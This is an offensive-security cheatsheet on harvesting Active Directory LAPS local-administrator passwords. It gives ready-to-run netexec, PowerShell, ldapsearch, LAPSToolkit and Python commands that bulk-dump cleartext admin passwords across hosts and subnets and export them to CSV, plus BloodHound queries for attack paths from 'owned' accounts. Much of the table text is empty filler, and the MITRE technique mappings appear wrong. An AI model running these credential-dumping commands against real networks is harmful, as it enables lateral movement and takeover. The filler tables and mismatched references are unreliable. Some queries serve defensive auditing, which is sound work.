---
aliases:
  - LAPS Tooling
  - Get-AdmPwdPassword
  - LAPSToolkit
  - BloodHound LAPS
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - LAPS Enumeration]]"
  - "[[netexec]]"
  - "[[BloodHound & SharpHound]]"
---
# AD - LAPS Enumeration - Tooling

***

## netexec / crackmapexec

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Bulk LAPS read | `nxc smb hosts.txt -u u -p p --laps` | Standard. |
| LDAP-based LAPS | `nxc ldap DC -u u -p p --laps` | Adjacent. |
| Anonymous attempt | `nxc smb DC -u '' -p '' --laps` | Edge. |
| Single host | `nxc smb host -u u -p p --laps` | Targeted. |
| Bulk subnet | `nxc smb 10.0.0.0/24 --laps` | Sweep. |
| Output to file | Standard | Reportable. |
| `--continue-on-success` | Per-host | Standard. |
| Verbose `-v` | Debug | Standard. |
| Combined with --shares | Lateral prep | Workflow. |
| Combined with --sessions | Adjacent | Adjacent. |
| Combined with --gmsa | Comprehensive | Adjacent. |
| Supports LAPSv1 + LAPSv2 | Modern | Standard. |
| Auto-decrypt LAPSv2 if authorized | Standard | Standard. |
| `crackmapexec smb hosts -u u -p p --laps` | Older name | Same. |
| `cme` alias | Same | Compat. |
| Custom queries | `--query "(filter)" "attrs"` | Flexible. |
^ad-laps-tool-netexec

### netexec recipes

```bash
DC="dc01.dom.local"
USER="user"; PASS="pass"

# Bulk LAPS read
nxc ldap $DC -u $USER -p $PASS --computers > computers.txt
nxc smb computers.txt -u $USER -p $PASS --laps

# Combined recon
nxc smb computers.txt -u $USER -p $PASS --laps --shares --sessions

# Anonymous probe
nxc smb $DC -u '' -p '' --laps  # likely fails (CONFIDENTIAL flag)

# Single targeted
nxc smb 10.0.0.50 -u $USER -p $PASS --laps
```

___

## RSAT / PowerShell Native LAPS Modules

| **Comando** | **Module** | **Notas** |
|:---:|:---:|:---:|
| `Get-AdmPwdPassword -ComputerName host` | AdmPwd.PS (LAPSv1) | Standard. |
| `Find-AdmPwdExtendedRights -Identity OU` | AdmPwd.PS | ACL helper. |
| `Set-AdmPwdReadPasswordPermission` | AdmPwd.PS | Privileged. |
| `Set-AdmPwdResetPasswordPermission` | AdmPwd.PS | Privileged. |
| `Set-AdmPwdComputerSelfPermission` | AdmPwd.PS | Privileged. |
| `Update-AdmPwdADSchema` | AdmPwd.PS | Privileged install. |
| `Reset-AdmPwdPassword` | AdmPwd.PS | Privileged. |
| `Get-LapsADPassword -Identity host` | LAPS (Windows native) | LAPSv2. |
| `Get-LapsADPassword -Identity host -AsPlainText` | LAPSv2 cleartext | Standard. |
| `Get-LapsAADPassword` | LAPS (cloud) | Azure AD LAPS. |
| `Find-LapsADExtendedRights -Identity OU` | LAPS | ACL helper. |
| `Set-LapsADReadPasswordPermission` | LAPS | Privileged. |
| `Set-LapsADResetPasswordPermission` | LAPS | Privileged. |
| `Set-LapsADComputerSelfPermission` | LAPS | Privileged. |
| `Update-LapsADSchema` | LAPS | Privileged. |
| `Reset-LapsPassword` | LAPS | Privileged. |
^ad-laps-tool-pwsh

### PowerShell LAPS recipes

```powershell
# LAPSv1 (legacy)
Import-Module AdmPwd.PS

Get-AdmPwdPassword -ComputerName WS01
Find-AdmPwdExtendedRights -Identity "OU=Workstations,DC=dom,DC=local"

# LAPSv2 (modern, native Server 2022+)
Import-Module LAPS

Get-LapsADPassword -Identity WS01 -AsPlainText
Find-LapsADExtendedRights -Identity "OU=Workstations,DC=dom,DC=local"

# Bulk read all computers
Get-ADComputer -Filter * | ForEach-Object {
  try {
    $pwd = Get-LapsADPassword -Identity $_ -AsPlainText -ErrorAction SilentlyContinue
    if ($pwd) {
      [PSCustomObject]@{ Computer = $_.Name; Password = $pwd.Password }
    }
  } catch {}
}

# Azure AD LAPS (hybrid)
Import-Module Microsoft.Graph
Connect-MgGraph -Scopes "DeviceLocalCredential.Read.All"
Get-MgDirectoryDeviceLocalCredential -DeviceId <id>
```

___

## ldapsearch / Linux LDAP

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| LAPSv1 read | `ldapsearch ... cn=host ms-Mcs-AdmPwd` | Direct. |
| LAPSv2 cleartext | `ldapsearch ... cn=host msLAPS-Password` | Modern. |
| LAPSv2 encrypted (binary) | `ldapsearch ... cn=host msLAPS-EncryptedPassword` | Encrypted blob. |
| Filter computers with LAPS set | `(ms-Mcs-AdmPwd=*)` or `(msLAPS-Password=*)` | Filter. |
| LDAPS encryption | `-H ldaps://DC` | Standard. |
| Authenticated bind | `-D 'dom\u' -w pass` | Standard. |
| Anonymous bind | `-x` | Edge (likely blocked). |
| Bulk search | All computers + LAPS | Standard. |
| Cross-domain via GC | `-p 3268` | Edge. |
| Output LDIF | Default | Standard. |
| Output text | `-t` for binary | Edge. |
| Per-attr ACL | Granular | Standard. |
| Schema query | `CN=Schema,...` | Foundation. |
| Standard Linux | Universal | Standard. |
| windapsearch wrapper | Helper | Adjacent. |
| LDAPDomainDump | HTML report | Standard. |
^ad-laps-tool-ldapsearch

### Linux LDAP

```bash
# LAPSv1 read all computers
ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
  "(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))" \
  cn dNSHostName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime

# LAPSv2 cleartext
ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
  "(&(objectCategory=computer)(msLAPS-Password=*))" \
  cn dNSHostName msLAPS-Password

# LAPSv2 encrypted (binary blob — needs decryption)
ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
  "(&(objectCategory=computer)(msLAPS-EncryptedPassword=*))" \
  cn dNSHostName msLAPS-EncryptedPassword
```

___

## BloodHound LAPS

| **Function** | **Detail** | **Notas** |
|:---:|:---:|:---:|
| `ReadLAPSPassword` edge | Direct LAPS read permission | Modern. |
| Per-OU LAPS coverage | Visualization | Tool. |
| Cypher: find LAPS readers | `MATCH (u)-[:ReadLAPSPassword]->(c)` | Standard. |
| SharpHound LAPS collection | Default in BHCE 5.x+ | Standard. |
| RustHound LAPS support | Modern | Tool. |
| BloodHound.py LAPS | `-c LAPSReaders` | Adjacent. |
| AzureHound LAPS (hybrid) | Cloud | Modern. |
| Per-domain ingest | Multi-domain LAPS | Adjacent. |
| Cypher: privileged readers | `WHERE u.adminCount=true` | Targeted. |
| Cypher: cross-trust readers | `WHERE u.domain<>c.domain` | Critical. |
| Cypher: shortest path to LAPS read | Custom paths | Standard. |
| BloodHound CE 6.x improved LAPS | Modern | Tool. |
| Custom analytics | Cypher scripts | Tool. |
| Visual graph: LAPS reader hierarchy | Useful | Standard. |
| Audit baseline | BloodHound CE | Standard. |
| Detection: BloodHound collection events | Defender | Adjacent. |
^ad-laps-tool-bh

### BloodHound LAPS Cypher

```cypher
// All LAPS readers
MATCH p=(u)-[:ReadLAPSPassword|MemberOf*1..]->(c:Computer)
RETURN p

// Privileged users with LAPS read access (CRITICAL audit)
MATCH (u:User {adminCount: true})
MATCH p=(u)-[:MemberOf|ReadLAPSPassword*1..]->(c:Computer)
RETURN u.name, c.name, p

// Foreign principals reading LAPS (cross-trust)
MATCH (u)-[:ReadLAPSPassword|MemberOf*1..]->(c:Computer)
WHERE u.domain <> c.domain
RETURN u.name, c.name

// Authenticated Users with LAPS read (CRITICAL misconfig)
MATCH (u {name: "AUTHENTICATED USERS@DOM.LOCAL"})
MATCH p=(u)-[:ReadLAPSPassword|MemberOf*1..]->(c:Computer)
RETURN p

// Shortest path from owned to LAPS-protected DA computer
MATCH (owned {owned: true}), (target:Computer {operatingsystem: "Windows Server"})
MATCH p=shortestPath((owned)-[:ReadLAPSPassword|MemberOf*1..]->(target))
RETURN p
```

___

## LAPSToolkit (Community)

| **Comando** | **Function** | **Notas** |
|:---:|:---:|:---:|
| `Get-LAPSComputers` | List LAPS-deployed computers | Standard. |
| `Get-LAPSDelegatedGroups` | Groups with LAPS read | Adjacent. |
| `Find-LAPSDelegatedGroups` | Same | Standard. |
| `Get-LAPSPasswords` | Bulk LAPS dump | Standard. |
| `LAPSToolkit.ps1` | All-in-one PS module | Adversary. |
| Per-OU enumeration | Standard | Standard. |
| Per-host detail | Standard | Standard. |
| Output: CSV/JSON | Reportable | Standard. |
| Adversary tool focus | Red team | Standard. |
| Modern alternative: `LAPS-and-then-some` | Edge | Edge. |
| Alternative: `Get-DomainLapsPassword` (PowerView) | Adjacent | Adjacent. |
| Custom LAPS dumpers | DIY | Edge. |
| `nxc smb --laps` modern | Better | Standard. |
| Github archived (LAPS legacy) | Adjacent | Adjacent. |
| Microsoft removed older docs | Adjacent | Adjacent. |
| Compliance: red team scoped use | Standard | OPSEC. |
^ad-laps-tool-laptoolkit

### LAPSToolkit usage

```powershell
# Install (clone from GitHub)
git clone https://github.com/leoloobeek/LAPSToolkit
Import-Module .\LAPSToolkit\LAPSToolkit.ps1

# All LAPS-deployed computers
Get-LAPSComputers | Select Computer,Expiration

# Groups with LAPS read delegation
Get-LAPSDelegatedGroups | Select Group,DistinguishedName

# Bulk dump
Get-LAPSPasswords | Select Computer,Password,Expiration |
  Export-Csv laps.csv -NoTypeInformation
```

___

## Impacket / Linux Helpers

| **Tool** | **Use** | **Notas** |
|:---:|:---:|:---:|
| `bloodhound-python -c LAPSReaders` | Linux BH collector | Standard. |
| `windapsearch --laps` | Wrapper | Helper. |
| `ldapdomaindump` | HTML report includes LAPS | Standard. |
| `LAPSDumper` (Python) | Direct LAPSv1 dump | Adjacent. |
| `ldap3` Python lib | Custom DIY | Flexible. |
| `bloodyAD --laps` | Custom | Edge. |
| `pylaps` (community) | Edge | Edge. |
| Custom LDAP scripts | DIY | Standard. |
| `nxc ldap DC --laps` | netexec | Standard. |
| netexec passive collection | Adjacent | Adjacent. |
| Manual ldapsearch + parse | Direct | Standard. |
| Cross-platform: Python preferred | Linux | Standard. |
| Encrypted LAPSv2 decrypt rare in Linux | Edge | Edge. |
| Native PS preferred for LAPSv2 decrypt | Standard | Standard. |
| Detection: bulk Linux LAPS reads | Defender | Adjacent. |
| Modern alternative: BHCE 6.x | Modern | Tool. |
^ad-laps-tool-impacket

### Linux LAPS pipeline

```bash
DC="dc01.dom.local"
USER="user"; PASS="pass"
DOM="dom.local"

# bloodhound-python with LAPS
bloodhound-python -d $DOM -u $USER -p $PASS -ns $DC -c All --zip

# windapsearch
python3 windapsearch.py -d $DOM -u $USER -p $PASS --dc $DC --laps

# ldapdomaindump (HTML report includes LAPS)
ldapdomaindump $DOM/$USER:$PASS@$DC

# Custom Python with ldap3 (LAPSv1)
python3 -c "
from ldap3 import Server, Connection, ALL, NTLM
s = Server('$DC', get_info=ALL)
c = Connection(s, user='$DOM\\$USER', password='$PASS', authentication=NTLM)
c.bind()
c.search('DC=dom,DC=local', '(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))', attributes=['cn','ms-Mcs-AdmPwd'])
for entry in c.entries:
    print(f'{entry.cn}: {entry[\"ms-Mcs-AdmPwd\"]}')
"
```

___

## Wordlists & Recursos

| **Recurso** | **URL / Path** | **Notas** |
|:---:|:---:|:---:|
| HackTricks - LAPS | `book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps` | Reference. |
| The Hacker Recipes - LAPS | `thehacker.recipes/ad/movement/access-control/laps` | Comprehensive. |
| Microsoft - LAPS Documentation | `learn.microsoft.com/en-us/windows-server/identity/laps/` | Vendor. |
| Microsoft - LAPSv2 Migration Guide | learn.microsoft.com | Standard. |
| BloodHound docs | `bloodhound.specterops.io` | Tool docs. |
| LAPSToolkit (legacy) | `github.com/leoloobeek/LAPSToolkit` | Adversary tool. |
| LAPSDumper | GitHub Python | Edge tool. |
| netexec docs | `wiki.porchetta.industries` | Tool. |
| Sean Metcalf - LAPS Best Practices | `adsecurity.org` | Defender. |
| Will Schroeder - LAPS Bypass | Specter Ops blog | Research. |
| Windows LAPS native module docs | learn.microsoft.com | Vendor. |
| MITRE ATT&CK T1003.008 | OS Credential Dumping | Adjacent. |
| MITRE ATT&CK T1552.006 | Credentials in Files | Adjacent. |
| LAPSv2 Decrypt research | T0X1Cx GitHub | Research. |
| Compliance: NIST recommend LAPS | Best practice | Standard. |
| `awesome-active-directory` | GitHub | Foundation. |
^ad-laps-tool-resources

***
